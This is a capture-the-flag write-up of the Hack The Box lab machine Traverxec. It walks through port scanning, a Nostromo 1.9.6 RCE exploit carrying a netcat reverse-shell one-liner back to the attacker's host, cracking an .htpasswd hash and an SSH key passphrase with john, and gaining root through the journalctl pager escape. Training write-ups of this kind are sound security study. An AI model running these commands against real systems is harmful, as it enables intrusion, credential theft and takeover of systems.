---
title: Traverxec 
category: BOX - Traverxec
type: htb_box
layout: page
img-link: 
desc: 10.10.10.165 - [EASY] Traverxec
tags: traverxec writeup hackthebox
---

# [EASY] Timelapse <br/>

<img src="images/traverxec/traverxec-01.png" alt="Jadu" style="max-width: 70%; height: auto;">

# [EASY] Traverxec <br/>

**Traverxec** stands out as an approachable box with an 'easy' rating on Hack The Box. My journey began by gaining an initial foothold as the user '**www-data**.' I achieved this by leveraging an RCE exploit against the **Nostromo** web server, which opened doors for further exploration. Transitioning from 'www-data' to '**david**' involved a clever privilege escalation maneuver. I delved into the configuration files of Nostromo, uncovering SSH identity keys that provided me with a path to 'david.' Finally, my path to 'root' was marked by seizing an opportunity with a **journalctrl** vulnerability. It was a thrilling adventure indeed!

# <span style="color:red">Introduction</span> 




# <span style="color:red">Box Info</span>

<table>
  <thead>
    <tr>
      <th>Name</th>
    <th style="text-align: right"><a href="https://affiliate.hackthebox.com/box?box=traverxec" target="_blank" style="font-size: xx-large; : 0 0 5px #ffffff, 0 0 3px #ffffff; color: #ffffff">
      Traverxec
      </a><br /></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>OS</td>
      <td style="text-align: right"><a style="font-size: x-large; : 0 0 5px #ffffff, 0 0 7px #ffffff; color: #2020E">
      Linux
      </a></td>
    </tr>
     <tr>
      <td>1st User blood</td>
      <td style="text-align: right"><a href="https://www.hackthebox.eu/home/users/profile/38547"><img src="https://www.hackthebox.eu/badge/image/38547"  style="display: unset" /></a></td>
    </tr>
    <tr>
      <td>1st System blood</td>
      <td style="text-align: right"><a href="https://www.hackthebox.eu/home/users/profile/91278"><img src="https://www.hackthebox.eu/badge/image/91278"  style="display: unset" /></a></td>
    </tr>
  </tbody>
</table>




# <span style="color:red">Basic Enuemeration</span>
## Scanning for open ports using Nmap

Traverxec seems to have only two ports open: 22(**ssh**) and 80(**http**).
<br />

```bash
┌──(yoon㉿kali)-[~/Documents/htb/traverxec/nmap]
└─$ cat open-port-scan             
# Nmap 7.93 scan initiated Sun Oct 29 22:41:31 2023 as: nmap -Pn -p- -vv -oN nmap/open-port-scan 10.10.10.165
Nmap scan report for 10.10.10.165
Host is up, received user-set (0.24s latency).
Scanned at 2023-10-29 22:41:31 EDT for 507s
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sun Oct 29 22:49:58 2023 -- 1 IP address (1 host up) scanned in 507.83 seconds
```

## Scanning for versions using Nmap

There's nothing interesting about SSH version, but port 80 web server is something that I have never came across before. 
<br />

Searching for **nostromo 1.9.6** on Google, I instantly found exploit that leds to RCE.
<br />


```bash
┌──(yoon㉿kali)-[~/Documents/htb/traverxec/nmap]
└─$ cat version-scan-22-80 
# Nmap 7.93 scan initiated Sun Oct 29 22:52:34 2023 as: nmap -sVC -p 22,80 -vv -oN nmap/version-scan-22-80 10.10.10.165
Nmap scan report for 10.10.10.165
Host is up, received reset ttl 63 (0.43s latency).
Scanned at 2023-10-29 22:52:34 EDT for 19s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa99a81668cd41ccf96c8401c759095c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDVWo6eEhBKO19Owd6sVIAFVCJjQqSL4g16oI/DoFwUo+ubJyyIeTRagQNE91YdCrENXF2qBs2yFj2fqfRZy9iqGB09VOZt6i8oalpbmFwkBDtCdHoIAZbaZFKAl+m1UBell2v0xUhAy37Wl9BjoUU3EQBVF5QJNQqvb/mSqHsi5TAJcMtCpWKA4So3pwZcTatSu5x/RYdKzzo9fWSS6hjO4/hdJ4BM6eyKQxa29vl/ea1PvcHPY5EDTRX5RtraV9HAT7w2zIZH5W6i3BQvMGEckrrvVTZ6Ge3Gjx00ORLBdoVyqQeXQzIJ/vuDuJOH2G6E/AHDsw3n5yFNMKeCvNNL
|   256 93dd1a23eed71f086b58470973a388cc (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLpsS/IDFr0gxOgk9GkAT0G4vhnRdtvoL8iem2q8yoRCatUIib1nkp5ViHvLEgL6e3AnzUJGFLI3TFz+CInilq4=
|   256 9dd6621e7afb8f5692e637f110db9bce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGJ16OMR0bxc/4SAEl1yiyEUxC3i/dFH7ftnCU7+P+3s
80/tcp open  http    syn-ack ttl 63 nostromo 1.9.6
|_http-title: TRAVERXEC
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nostromo 1.9.6
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Oct 29 22:52:53 2023 -- 1 IP address (1 host up) scanned in 19.25 seconds
```

# <span style="color:red">Initial Foothold</span>

[Here](https://github.com/theRealFr13nd/CVE-2019-16278-Nostromo_1.9.6-RCE/blob/master/CVE-2019-16278.py), I found python script that helps with RCE.
<br />
Using the script, I ran reverse shell command towards my local machine with nc listener running locally:
<br />

```bash
┌──(yoon㉿kali)-[~/Documents/htb/traverxec]
└─$ python github-cve2019-16278.py -t 10.10.10.165 -p 80 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.3 4444 >/tmp/f'
b'HTTP/1.1 200 OK\r\nDate: Thu, 02 Nov 2023 08:33:10 GMT\r\nServer: nostromo 1.9.6\r\nConnection: close\r\n\r\n\r\n'
```
<br />
Now I have a reverse shell as user **www-data**.
<br />

I upgraded the shell by importing python tty shell and upgraded to full **tty** bv setting **stty** option:
<br />

```bash
┌──(yoon㉿kali)-[~/Documents/htb/traverxec]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.10.165] 45178
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@traverxec:/usr/bin$ ^Z
zsh: suspended  nc -lvnp 4444
                                                                    
┌──(yoon㉿kali)-[~/Documents/htb/traverxec/revshell]
└─$ stty raw -echo; fg                             
[1]  + continued  nc -lvnp 4444
                               reset
reset: unknown terminal type unknown
Terminal type? xterm-256color

www-data@traverxec:/usr/bin$ 
```


# <span style="color:red">Enumerating user www-data</span>

On **home** directory I found user **david**'s folder which is expected to have user.txt flag in it. 
<br />

However, user **www-data** has no access to reading files inside **david** so I need to escalate my privilege to david. 
<br />

```bash
www-data@traverxec:/usr/bin$ cd /home/david
www-data@traverxec:/home/david$ ls
ls: cannot open directory '.': Permission denied
```

## Basic enumeration for privesc

I first checked for what groups **www-data** might be included in. 
<br />
However no interesting group was found:
<br />

```bash
www-data@traverxec:/home/david$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
<br />

After, I listed users who has access to **/bin/bash**, and seems like only **root** and **david** has access to it:
<br >

```bash
www-data@traverxec:/home/david$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
david:x:1000:1000:david,,,:/home/david:/bin/bash
```
<br />

I also checked on **SETUID** files but it looked standard, nothing interesting found:
<br />

```bash
www-data@traverxec:/home/david$  find / -perm -4000 -ls 2>/dev/null
    28460    428 -rwsr-xr-x   1 root     root       436552 Oct  6  2019 /usr/lib/openssh/ssh-keysign
    33376     16 -r-sr-xr-x   1 root     root        13628 Nov 12  2019 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
    34998     16 -r-sr-xr-x   1 root     root        14320 Nov 12  2019 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
    25064     52 -rwsr-xr--   1 root     messagebus    51184 Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
      938     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
    32133     36 -rwsr-xr-x   1 root     root          34896 Apr 22  2020 /usr/bin/fusermount
    32850    156 -rwsr-xr-x   1 root     root         157192 Oct 12  2019 /usr/bin/sudo
    11830     36 -rwsr-xr-x   1 root     root          34888 Jan 10  2019 /usr/bin/umount
    11494     64 -rwsr-xr-x   1 root     root          63568 Jan 10  2019 /usr/bin/su
     6847     84 -rwsr-xr-x   1 root     root          84016 Jul 27  2018 /usr/bin/gpasswd
    11347     44 -rwsr-xr-x   1 root     root          44440 Jul 27  2018 /usr/bin/newgrp
    11828     52 -rwsr-xr-x   1 root     root          51280 Jan 10  2019 /usr/bin/mount
     6845     44 -rwsr-xr-x   1 root     root          44528 Jul 27  2018 /usr/bin/chsh
     6849     64 -rwsr-xr-x   1 root     root          63736 Jul 27  2018 /usr/bin/passwd
     6844     56 -rwsr-xr-x   1 root     root          54096 Jul 27  2018 /usr/bin/chfn
```
<br />

Lastly, I checked what files does user **www-data** has access to with command: ```find / -user www-data 2>/dev/null```
<br />
```bash
www-data@traverxec:/home/david$ find / -user www-data 2>/dev/null
/dev/pts/0
/proc/540
/proc/540/task
/proc/540/task/540
/proc/540/task/540/net
/proc/7378/task/7378/fd
/proc/7378/task/7378/fd/0
/proc/7378/task/737 8/fd/1
/proc/7378/task/7378/fd/2
<snip>
```
<br />

There were too many lines so I cutted out unimportant looking files by command: ```find / -user www-data 2>/dev/null | grep -Ev '(/proc/|/sys/)'```

<br />

```bash
www-data@traverxec:/home/david$ find / -user www-data 2>/dev/null | grep -Ev '(/proc/|/sys/)
/dev/pts/0
/tmp/f
/var/nostromo/logs
/var/nostromo/logs/nhttpd.pid
```
<br />

I probably should check inside **/var/nostromo**.

## /var/nostromo

Looking into **/var/nostromo**, I found four folders: **conf**, **htdocs**, **icons**, and **logs**.
<br />

**conf** folder is something that I should definitely look into
<br />

```bash
www-data@traverxec:/var/nostromo$ ls
conf  htdocs  icons  logs
```

### /var/nostromo/conf


Inside **conf** folder I found these three files:
<br />

```bash
www-data@traverxec:/var/nostromo/conf$ ls -al
total 20
drwxr-xr-x 2 root daemon 4096 Oct 27  2019 .
drwxr-xr-x 6 root root   4096 Oct 25  2019 ..
-rw-r--r-- 1 root bin      41 Oct 25  2019 .htpasswd
-rw-r--r-- 1 root bin    2928 Oct 25  2019 mimes
-rw-r--r-- 1 root bin     498 Oct 25  2019 nhttpd.conf
```

**.htpasswd** holds a encrypted password which I probably can crack with john:
<br />

```bash
www-data@traverxec:/var/nostromo/conf$ cat .htpasswd 
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```
<br />

I copied encrypted password to my local machine naming it as **traverxec-htpasswd.hash**.
<br />

Cracking **traverxec-htpasswd.hash** with john , I got password for david:
<br />

```bash
┌──(yoon㉿kali)-[~/Documents/htb/traverxec]
└─$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt traverxec-htpasswd.hash
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Nowonly4me       (david)     
1g 0:00:00:24 DONE (2023-11-02 05:06) 0.04022g/s 425520p/s 425520c/s 425520C/s Noyoudo..Nous4=5
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
<br />

After getting the password, I tried SSHing as **david** in to the server but it didn't work. 
<br />

Now looking in to **nhttpd.conf**, last two lines about homedirs looks interesting:
<br />

```bash
www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf 
# MAIN [MANDATORY]

servername		traverxec.htb
serverlisten		*
serveradmin		david@traverxec.htb
serverroot		/var/nostromo
servermimes		conf/mimes
docroot			/var/nostromo/htdocs
docindex		index.html

# LOGS [OPTIONAL]

logpid			logs/nhttpd.pid

# SETUID [RECOMMENDED]

user			www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess		.htaccess
htpasswd		/var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons			/var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs		/home
homedirs_public		public_www
```
<br /> 

From bit of goolging, from this [link](https://kashz.gitbook.io/kashz-jewels/services/nostromo) I found out that users can access **/home** directory via HTTP.
<br />

For user **david**, I was able to access **/home/~david** via http but nothing interesting was found.
<br />

![Alt text](<images/../images/traverxec/Screenshot%20from%202023-11-02%2017-17-39.png>)

<br />

Luckily, I was able to gain access to **public_www** through shell:
<br />
```bash
www-data@traverxec:/home/david/public_www$ ls -al
total 16
drwxr-xr-x 3 david david 4096 Oct 25  2019 .
drwx--x--x 6 david david 4096 Nov  2 03:34 ..
-rw-r--r-- 1 david david  402 Oct 25  2019 index.html
drwxr-xr-x 2 david david 4096 Oct 25  2019 protected-file-area
```
<br />

**protected-file-area** holds potential SSH configuration file I hope it belongs to david.

<br />

```bash
www-data@traverxec:/home/david/public_www/protected-file-area$ ls
backup-ssh-identity-files.tgz
```

# <span style="color:red">Privesc www-data -> david</span> 

Let's first copy file to local machine so that I can unzip with more freedom. 
<br />

I first converted **tgz** file with base64:
<br />

```bash
www-data@traverxec:/home/david/public_www/protected-file-area$ base64 backup-ssh-identity-files.tgz                     
H4sIAANjs10AA+2YWc+jRhaG+5pf8d07HfYtV8O<snip>
ktebbV5OatEvF5sO0fmPwL7Uf19+F7zrvz+A9/nvr33+
e/PmzZs3b968efPmzZs3b968efPmzf8vfweR13qfACgAAA==
```
<br />

I copy pasted base64 result to my local machine and named it as **traverxec-tgz.b64**.
<br />
After, I base64 decoded back to tgz file on my local machine:
<br />

```bash
┌──(yoon㉿kali)-[~/Documents/htb/traverxec]
└─$ sudo base64 -d traverxec-tgz.b64 > traverxec-ssh.tgz
```
<br />

Now unzipping tgz file, I have a access to david's ssh keys:
<br />

```bash
┌──(yoon㉿kali)-[~/Documents/htb/traverxec/unzipped]
└─$ sudo tar -xzvf traverxec-ssh.tgz                    
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
```
<br />
As expected, **id_rsa** key is encrypted so I need to decrypt it:
<br />

```bash
┌──(yoon㉿kali)-[~/…/unzipped/home/david/.ssh]
└─$ cat id_rsa                 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,477EEFFBA56F9D283D349033D5D08C4F

seyeH/feG19TlUaMdvHZK/2qfy8pwwdr9sg75x4hPpJJ8YauhWorCN4LPJV+wfCG
tuiBPfZy+ZPklLkOneIggoruLkVGW4k4651pwekZnjsT8IMM3jndLNSRkjxCTX3W
KzW9VFPujSQZnHM9Jho6J8O8LTzl+s6GjPpFxjo2Ar2nPwjofdQejPBeO7kXwDFU
RJUpcsAtpHAbXaJI9LFyX8IhQ8frTOOLuBMmuSEwhz9KVjw2kiLBLyKS+sUT9/V7
<snip>
-----END RSA PRIVATE KEY-----
```

<br />

I first created hash file using **ssh2john** and cracked it with john, getting the password **hunder**:
<br />

```bash
┌──(yoon㉿kali)-[~/…/unzipped/home/david/.ssh]
└─$ ssh2john id_rsa > id_rsa.hash                  
                                                
┌──(yoon㉿kali)-[~/…/unzipped/home/david/.ssh]
└─$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (id_rsa)     
1g 0:00:00:00 DONE (2023-11-02 05:30) 100.0g/s 16000p/s 16000c/s 16000C/s carolina..david
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
<br />

Now I can SSH in as user **david**, with passphrase **hunter**:
<br />

```bash
┌──(yoon㉿kali)-[~/…/unzipped/home/david/.ssh]
└─$ ssh -i id_rsa david@10.10.10.165 
Enter passphrase for key 'id_rsa': 
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
Last login: Thu Nov  2 03:20:36 2023 from 10.10.16.3
david@traverxec:~$ id
uid=1000(david) gid=1000(david) groups=1000(david),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

# <span style="color:red">Privesc david -> root</span> 

Checking on what files are in david's home folder I see **/bin** which is quite unusual:
<br />

```bash
david@traverxec:~$ ls -l
total 144
drwx------ 2 david david   4096 Nov  2 03:41 bin
drwxr-xr-x 3 david david   4096 Oct 25  2019 public_www
-r--r----- 1 root  david     33 Nov  2 00:27 user.txt
```
<br />

Inside **/bin** I have two files **server-stats.head** and **server-stats.sh**:
<br />

```bash
david@traverxec:~/bin$ ls
server-stats.head  server-stats.sh
david@traverxec:~/bin$ cat server-stats.sh
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
```
<br />

What is interesting is the last line where it calls on **journalctl** using sudo right.
<br />

According to [GTFOBins](https://gtfobins.github.io/gtfobins/journalctl/), we can easily escalate privilege through journalctl.

<br />

```bash
sudo journalctl !/bin/sh
```
<br />

One problem is that I cannot call on **!/bin/sh** when journalctrl has enough space, outputting as stdout. 
<br />

Therefore, I need to make the terminal smaller so that output comes out in **less** format.
<br />

I made terminal as small as possible running ```/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service``` command and as expected output was in **less** format.
<br />

Calling ```!/bin/sh```, now I have root privilege:
<br />

```bash
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Thu 2023-11-02 00:27:32 EDT, end at Thu 2023-11-02 05:44:54 E
Nov 02 01:06:24 traverxec su[997]: FAILED SU (to david) www-data on pts/0
Nov 02 05:08:45 traverxec sudo[7402]: pam_unix(sudo:auth): authentication fail
!/bin/sh
# whoami
root

```



## Sources
- https://github.com/theRealFr13nd/CVE-2019-16278-Nostromo_1.9.6-RCE/blob/master/CVE-2019-16278.py
- https://gtfobins.github.io/gtfobins/journalctl/
